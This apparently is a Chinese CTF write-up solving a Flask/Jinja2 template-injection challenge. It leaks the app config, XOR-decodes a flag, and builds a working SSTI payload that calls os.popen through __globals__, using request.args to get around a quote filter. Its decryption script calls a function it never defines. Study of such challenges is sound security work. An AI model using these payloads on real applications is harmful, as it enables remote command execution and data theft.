+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>) </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>导入<code>Flask</code>类</li>
+<li>创建一个该类的实例</li>
+<li>用<code>route()</code>装饰器来告诉<code>Flask</code>触发函数的<code>URL</code></li>
+<li>函数名称被用来生成相关联的URL</li>
+<li>最后返回需要在用户浏览器中显示的信息</li>
+</ol>
+<p><strong>二、让这个 “hello world” 跑起来的方法</strong></p>
+<ol>
+<li><p>powershell</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">env:FLASK_APP=<span class="string">&quot;flaskr&quot;</span>    --&gt;  flaskr指项目名称</span></span><br><span class="line">flask run</span><br></pre></td></tr></table></figure></li>
+<li><p>cmd</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set FLASK_APP=flaskr       --&gt;  flaskr指项目名称</span><br><span class="line">set FLASK_ENV=development</span><br><span class="line">flask run</span><br></pre></td></tr></table></figure></li>
+<li><p>linux</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">export</span> FLASK_APP=flaskr  --&gt;  flaskr指项目名称</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> flask run</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+<p><strong>三、如果使用PyCharm:</strong><br>如果是使用PyCharm来运行flask的话, 就会很简单。代码写好之后直接右键选择run, 就可以运行了</p>
+<p>参考文章:</p>
+<ol>
+<li>参考教程w3cschool <a href="https://www.w3cschool.cn/flask/flask_overview.html">https://www.w3cschool.cn/flask/flask_overview.html</a></li>
+<li>flask框架参考flask中文文档 <a href="https://dormousehole.readthedocs.io/en/latest/">https://dormousehole.readthedocs.io/en/latest/</a></li>
+<li><code>if __name__ == &#39;__main__&#39;</code>的理解参考<code>《如何简单地理解python中的if __name__ == &#39;__main__&#39;》</code><a href="https://blog.csdn.net/yjk13703623757/article/details/77918633/">https://blog.csdn.net/yjk13703623757/article/details/77918633/</a></li>
+</ol>
+<h2 id="三、解题过程"><a href="#三、解题过程" class="headerlink" title="三、解题过程"></a>三、解题过程</h2><p>题目源码如下:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template_string, render_template, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;evoa@Syclover | https://evoa.me 233333&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">line, key, key2</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(x ^ <span class="built_in">ord</span>(line[x]) ^ <span class="built_in">ord</span>(key[::-<span class="number">1</span>][x]) ^ <span class="built_in">ord</span>(key2[x])) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(line)))</span><br><span class="line"></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;/app/flag&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">flag = file.read()</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;flag&#x27;</span>] = encode(flag,<span class="string">&#x27;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3&#x27;</span>,<span class="string">&#x27;xwdFqMck1vA0pl7B8WO3DrG</span></span><br><span class="line"><span class="string">Lma4sZ2Y6ouCPEHSQVT&#x27;</span>)</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">os.remove(<span class="string">&quot;/app/flag&quot;</span>)</span><br><span class="line">nicknames = [<span class="string">&#x27;˜”*°★☆★_%s_★☆★°°*&#x27;</span>, <span class="string">&#x27;%s ~♡ⓛⓞⓥⓔ♡~&#x27;</span>, <span class="string">&#x27;%s Вêчңø в øĤлâйĤé&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;♪ ♪ ♪ %s ♪ ♪ ♪ &#x27;</span>, <span class="string">&#x27;[♥♥♥%s♥♥♥]&#x27;</span>, <span class="string">&#x27;%s, kOтO®Aя )(оТеЛ@ ©4@$tьЯ&#x27;</span>, <span class="string">&#x27;♔%s♔&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;[♂+♂=♥]%s[♂+♂=♥]&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p = request.values.get(<span class="string">&#x27;nickname&#x27;</span>)</span><br><span class="line">            <span class="built_in">id</span> = random.randint(<span class="number">0</span>, <span class="built_in">len</span>(nicknames) - <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> p != <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> p <span class="keyword">or</span> <span class="string">&#x27;_&#x27;</span> <span class="keyword">in</span> p <span class="keyword">or</span> <span class="string">&#x27;\&#x27;&#x27;</span> <span class="keyword">in</span> p:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&#x27;Your nickname contains restricted characters!&#x27;</span></span><br><span class="line">                <span class="keyword">return</span> render_template_string(nicknames[<span class="built_in">id</span>] % p)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Exception&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/syc&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">syc</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;.&quot;</span> <span class="keyword">in</span> request.args.get(<span class="string">&#x27;name&#x27;</span>) <span class="keyword">or</span> <span class="string">&quot;&#x27;&quot;</span> <span class="keyword">in</span> request.args.get(<span class="string">&#x27;name&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;&quot;&#x27;</span> <span class="keyword">in</span> request.args.get(<span class="string">&#x27;name&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;nonono&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(request.args.get(<span class="string">&#x27;name&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"> app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">1337</span>)</span><br></pre></td></tr></table></figure>
+
+<p>分析题目源码<br>该题目定义了两个路由</p>
+<ol>
+<li><code>@app.route(&#39;/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])</code></li>
+<li><code>@app.route(&#39;/syc&#39;)</code></li>
+</ol>
+<h3 id="1-配置里的flag"><a href="#1-配置里的flag" class="headerlink" title="1. 配置里的flag"></a>1. 配置里的flag</h3><p>路由 <code>@app.route(&#39;/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])</code> 作用为:<br>如果是POST请求，则将用户输入(nickname)赋值给参数p。否则直接返回index.html<br>如果参数p中(即nickname中)含有 <code>.</code>, <code>_</code>, <code>\&#39;</code> （点号, 下划线, 单引号）则返回值: <code>Your nickname contains restricted characters!</code><br>如果参数p中不包含非法字符, 则在数组nicknames中随机取出一个元素, 将用户输入(nickname)格式化输出。并且在输出时受到 <code>render_template_string()</code> 函数的影响</p>
+<p>对于 <code>render_template_string()</code> 函数<br>查阅flask官方文档可知, 在Flask中, Jinja2默认配置如下</p>
+<blockquote>
+<ul>
+<li>当使用 render_template() 时，扩展名为 .html 、 .htm 、 .xml 和 .xhtml 的模板中开启自动转义。</li>
+<li>当使用 render_template_string() 时，字符串开启 自动转义。</li>
+<li>在模板中可以使用<code>&#123;% autoescape %&#125;</code>来手动设置是否转义。</li>
+<li>Flask 在 Jinja2 环境中加入一些全局函数和辅助对象，以增强模板的功能。</li>
+</ul>
+</blockquote>
+<p>也就是说, <code>render_template_string()</code> 函数会将字符串以Jinja2模板的渲染规则进行转义。</p>
+<p>查阅Jinja2官方文档可知, 在Jinja2中, 默认定界符(delimiters)有如下几种:</p>
+<blockquote>
+<ul>
+<li><code>&#123;% ... %&#125;</code> for <a href="https://jinja.palletsprojects.com/en/2.10.x/templates/#list-of-control-structures">Statements</a></li>
+<li><code>&#123;&#123; ... &#125;&#125;</code> for <a href="https://jinja.palletsprojects.com/en/2.10.x/templates/#expressions">Expressions</a> to print to the template output</li>
+<li><code>&#123;# ... #&#125;</code> for <a href="https://jinja.palletsprojects.com/en/2.10.x/templates/#comments">Comments</a> not included in the template output</li>
+<li><code>#  ... ##</code> for <a href="https://jinja.palletsprojects.com/en/2.10.x/templates/#line-statements">Line Statements</a></li>
+</ul>
+</blockquote>
+<p>简单来说: </p>
+<ol>
+<li><p><code>&#123;% ... %&#125;</code> 是用来控制程序流程的定界符, 例如条件语句, 循环语句。使用语法与python类似, 但要注意在语法结束时要添加 <code>&#123;% endif %&#125;</code>, <code>&#123;% endfor %&#125;</code>…。一个简单的利用 <code>for</code> 循环, 遍历 <code>username</code> 的示例如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;h1&gt;Members&lt;/h1&gt;</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">&#123;% for user in users %&#125;</span><br><span class="line">  &lt;li&gt;&#123;&#123; user.username|e &#125;&#125;&lt;/li&gt;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure></li>
+<li><p><code>&#123;&#123; ... &#125;&#125;</code> 是允许使用基本表达式的定界符, 并将结果输出<br>例如: <code>&#123;&#123; 7*7 &#125;&#125;</code> 的返回值就是 <code>49</code></p>
+</li>
+<li><p><code>&#123;# ... #&#125;</code> 用于注释一整块语句, 注释用法如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;# note: commented-out template because we no longer use this</span><br><span class="line">    &#123;% for user in users %&#125;</span><br><span class="line">        ...</span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line">#&#125;</span><br></pre></td></tr></table></figure></li>
+<li><p><code>#  ... ##</code> 用于注释一行语句, 注释用法如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># for item in seq:</span><br><span class="line">    &lt;li&gt;&#123;&#123; item &#125;&#125;&lt;/li&gt;     ## this comment is ignored</span><br><span class="line"># endfor</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>参考flask模板 <a href="https://dormousehole.readthedocs.io/en/latest/templating.html?highlight=render_template_string#id2">https://dormousehole.readthedocs.io/en/latest/templating.html?highlight=render_template_string#id2</a></p>
+<blockquote>
+<p>缺省情况下，以下全局变量可以在 Jinja2 模板中使用:<br>config: 当前配置对象<br>request: 当前请求对象, 在没有活动请求环境情况下渲染模板时，这个变量不可用。<br>session: 当前会话对象, 在没有活动请求环境情况下渲染模板时，这个变量不可用。<br>g: 请求绑定的全局变量, 在没有活动请求环境情况下渲染模板时，这个变量不可用。</p>
+</blockquote>
+<p>既然config是全局变量, 而 <code>&#123;&#123; ... &#125;&#125;</code> 可以将基本表达式的结果输出, 并且 <code>render_template_string()</code> 会将字符串以Jinja2的规则转义。那是否可以利用 <code>render_template_string()</code> 先将 <code>&quot;&#123;&#123; ... &#125;&#125;&quot;</code> 字符串转义成Jinja2模板格式, 而转义之后就成了 <code>&#123;&#123; ... &#125;&#125;</code> 定界符, 再利用这个定界符输出 config 这个全局变量呢。<br>于是我搭建了一个测试环境, 代码跟输出结果如下:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template_string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">&quot;&#123;&#123; config &#125;&#125;&quot;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/08/30/%E8%AE%B0%E4%B8%80%E9%81%93%E5%85%B8%E5%9E%8B%E7%9A%84flask-SSTI%E9%A2%98%E7%9B%AE/1.jpg" class="">
+
+
+<p>很好, 可以看到成功读取到了 config 全局变量。<br>感觉到第一个flag就在眼前!<br>访问题目, 输入 <code>&#123;&#123; config &#125;&#125;</code></p>
+<img src="/2021/08/30/%E8%AE%B0%E4%B8%80%E9%81%93%E5%85%B8%E5%9E%8B%E7%9A%84flask-SSTI%E9%A2%98%E7%9B%AE/2.png" class="">
+
+<p>是flag!<br>不过有点遗憾的是, flag是加了密的。回到题目中, 再仔细看看代码。找到加密flag的部分:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">line, key, key2</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(x ^ <span class="built_in">ord</span>(line[x]) ^ <span class="built_in">ord</span>(key[::-<span class="number">1</span>][x]) ^ <span class="built_in">ord</span>(key2[x])) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(line)))</span><br><span class="line">    </span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;/app/flag&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">flag = file.read()</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;flag&#x27;</span>] = encode(flag,<span class="string">&#x27;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3&#x27;</span>,<span class="string">&#x27;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT&#x27;</span>)</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">os.remove(<span class="string">&quot;/app/flag&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>观察 <code>encode()</code> 函数, 发现返回值是由 <code>x</code>, <code>ord(line[x])</code>, <code>ord(key[::-1][x])</code>, <code>ord(key2[x])</code> 四部分亦或得到。<br>亦或参考文章<br>1）：<a href="https://www.cnblogs.com/tmdsleep/p/9933647.html">https://www.cnblogs.com/tmdsleep/p/9933647.html</a><br>2）：<a href="http://www.elecfans.com/d/653831.html">http://www.elecfans.com/d/653831.html</a></p>
+<p>通过学习异或运算可知:</p>
+<blockquote>
+<p>如果a、b两个值不相同，则异或结果为1。 如果a、b两个值相同，异或结果为0。 异或也叫半加运算，其运算法则相当于不带进位的二进制加法：二进制下用1表示真，0表示假，则异或的运算法则为：0⊕0=0，1⊕0=1，0⊕1=1，1⊕1=0（同为0，异为1），这些法则与加法是相同的，只是不带进位，所以异或常被认作不进位加法。</p>
+</blockquote>
+<p>而关于异或运算, 有一个推论<br>e = a ^ b ^ c ^ d 与<br>b = a ^ c ^ d ^ e 相等效</p>
+<p>又查询资料可知<br>ord()是将字符转换成ASCII；<br>chr()是将ASCII转换成字符<br>在加密flag的时候, 是将flag作为参数line传入。也就是说 <code>for x in range(len(line))</code> 的作用是获取flag中每一个字符的坐标, <code>ord(line[x])</code> 就是将flag中每一个字符转换成ASCII。</p>
+<p>即加密flag部分, 可以简单理解为:<br><code>密文 = x ^ flag ^ ord(key[::-1][x]) ^ ord(key2[x])</code></p>
+<p>根据推论解密flag, 即:<br><code>flag = x ^ 密文 ^ ord(key[::-1][x]) ^ ord(key2[x])</code></p>
+<p>解密脚本:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">encrypt_flag, key, key2</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(x ^ <span class="built_in">ord</span>(encrypt_flag[x]) ^ <span class="built_in">ord</span>(key[::-<span class="number">1</span>][x]) ^ <span class="built_in">ord</span>(key2[x])) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(encrypt_flag)))</span><br><span class="line">    </span><br><span class="line">encrypt_flag = <span class="string">&quot;\x18X5\x0cx\x19k&#125;\r\x01a\x0c\x1fT\x16X?hl\x1e\\OLL(n\x17\x0fi]B\x0fh8&quot;</span></span><br><span class="line">key = <span class="string">&quot;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3&quot;</span></span><br><span class="line">key2 = <span class="string">&quot;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(decode(encrypt_flag, key, key2))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Syc&#123;this_1s_Twice_interv1ew_F14g&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>解码得到第一个flag:<br><code>Syc&#123;this_1s_Twice_interv1ew_F14g&#125;</code></p>
+<p>其实仔细看一下, 构造的解密脚本其实和原加密脚本一样。</p>
+<h3 id="2-根目录下的flag"><a href="#2-根目录下的flag" class="headerlink" title="2. 根目录下的flag"></a>2. 根目录下的flag</h3><p>任务中说, 第二个flag在根目录下面, 于是想到利用模板注入漏洞达到命令执行的效果, 从而读取到根目录的文件。</p>
+<p>查阅跟模板注入的有关文档可知</p>
+<ol>
+<li><a href="https://xz.aliyun.com/t/3679">https://xz.aliyun.com/t/3679</a></li>
+<li><a href="https://www.kingkk.com/2018/06/Flask-Jinja2-SSTI-python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">https://www.kingkk.com/2018/06/Flask-Jinja2-SSTI-python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</a></li>
+</ol>
+<p>想要利用模板注入来达到命令执行的效果, 需要调用python的基类<br>首先利用 <code>__class__</code> 查询全局变量 <code>config</code> 的参数类型, 即 <code>&#123;&#123; config.__class__ &#125;&#125;</code>。执行查询, 结果如下。</p>
+<img src="/2021/08/30/%E8%AE%B0%E4%B8%80%E9%81%93%E5%85%B8%E5%9E%8B%E7%9A%84flask-SSTI%E9%A2%98%E7%9B%AE/3.png" class="">
+
+<p>感到疑惑, 再回到题目源码。看到在 <code>@app.route(&#39;/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])</code> 路由里, 过滤了参数 nickname 中的 <code>_</code> 和<code>.</code>。调用python基类所必须的下划线被过滤了, 所以查询全局变量 <code>config</code> 的类失败了。</p>
+<p>既然第一个路由已经把路封上了, 这时候去读第二个路由 <code>@app.route(&#39;/syc&#39;)</code> 的源码。发现过滤了 <code>.</code>, <code>&#39;</code>, <code>&quot;</code>。点号也被过滤了, 感觉题目已经无解了。这时候想到, 虽然调用基类的下划线是必须的, 绕不过去, 但是是否可以绕过点号的使用。百度查询很久, 没有发现任何绕过点号的方法。然后在群里看到师傅说, 把点号的限制删除了。这时候又可以继续做题了! </p>
+<p>分析 <code>@app.route(&#39;/syc&#39;)</code> 这个路由, 利用 <code>request.args.get(&#39;name&#39;)</code> 以GET方式传入了一个name参数, 再通过 <code>render_template_string()</code> 函数将name以Jinja2模板的渲染规则进行转义。</p>
+<p>先尝试读取全局变量: <code>http://114.116.44.23:58470/syc?name=&#123;&#123; config &#125;&#125;</code>, 成功得到config的值。</p>
+<img src="/2021/08/30/%E8%AE%B0%E4%B8%80%E9%81%93%E5%85%B8%E5%9E%8B%E7%9A%84flask-SSTI%E9%A2%98%E7%9B%AE/4.png" class="">
+
+<p>这时候发现, 对于配置里的flag, 不仅可以通过第一个路由读取, 而且第二个路由也可以读取到这个配置里的flag。</p>
+<p>继续读取根目录flag之路:<br>再次尝试读取全局变量 <code>config</code> 的参数类型, <code>http://114.116.44.23:58470/syc?name=&#123;&#123; config.__class__ &#125;&#125;</code> 得到返回结果 <code>&lt;class &#39;flask.config.Config&#39;&gt;</code></p>
+<p>然后利用 <code>__init__</code> 初始化类<br>再加 <code>__globals__</code> 全局查询所有的方法及变量及参数<br><code>http://114.116.44.23:58470/syc?name=&#123;&#123; config.__class__.__init__.__globals__ &#125;&#125;</code></p>
+<img src="/2021/08/30/%E8%AE%B0%E4%B8%80%E9%81%93%E5%85%B8%E5%9E%8B%E7%9A%84flask-SSTI%E9%A2%98%E7%9B%AE/5.png" class="">
+
+
+<p>全局查询之后, 发现有python3的os模块(在题目中也调用了os模块执行系统命令)。<br>查询官方文档之后, 得知 <code>os</code> 模块执行系统命令有两种方式 <code>os.system()</code> 和 <code>os.popen()</code></p>
+<p>其中 <code>os.system()</code> 无法获得输出和返回值, 所以这里采取 <code>os.popen()</code> 方法。使用 <code>read()</code> 方法可以看到输出结果。即 <code>os.popen().read()</code></p>
+<p>这时候一个完整的命令执行payload如下:<br><code>http://114.116.44.23:58470/syc?name=&#123;&#123; config.__class__.__init__.__globals__['os'].popen('whoami').read() &#125;&#125;</code></p>
+<p>这时候想到, 单引号是被过滤了的, 需要绕过单引号的过滤。查询资料得知, request.args是Flask中的一个属性，为返回请求的参数。我把 <code>module</code> 作为调用模块的变量名, 将调用的os模块传入。而<code>shell</code> 作为执行的命令的变量名, 将要执行的命令传入。<br>这时候构造的payload如下:<br><code>http://114.116.44.23:58470/syc?name=&#123;&#123; config.__class__.__init__.__globals__[request.args.module].popen(request.args.shell).read() &#125;&#125;&amp;module=os&amp;shell=whoami</code></p>
+<p>尝试执行, 得到结果如下: </p>
+<img src="/2021/08/30/%E8%AE%B0%E4%B8%80%E9%81%93%E5%85%B8%E5%9E%8B%E7%9A%84flask-SSTI%E9%A2%98%E7%9B%AE/6.png" class="">
+
+<p>命令能够成功执行了, 接下来就是拿flag了</p>
+<p>列下目录:</p>
+<img src="/2021/08/30/%E8%AE%B0%E4%B8%80%E9%81%93%E5%85%B8%E5%9E%8B%E7%9A%84flask-SSTI%E9%A2%98%E7%9B%AE/7.png" class="">
+
+<p>很好, 看到flag了。</p>
+<img src="/2021/08/30/%E8%AE%B0%E4%B8%80%E9%81%93%E5%85%B8%E5%9E%8B%E7%9A%84flask-SSTI%E9%A2%98%E7%9B%AE/8.png" class="">
+
+<p>…居然是假flag, 再看一下题目描述, flag是在服务器根目录。再去根目录下读一下flag。</p>
+<img src="/2021/08/30/%E8%AE%B0%E4%B8%80%E9%81%93%E5%85%B8%E5%9E%8B%E7%9A%84flask-SSTI%E9%A2%98%E7%9B%AE/9.png" class="">
+
+<p>拿到真flag了<br><code>Syc&#123;this_2s_Twice_interv1ew_F14g&#125;</code></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>SSTI</tag>
+        <tag>flask</tag>
+      </tags>
+  </entry>
+</search>
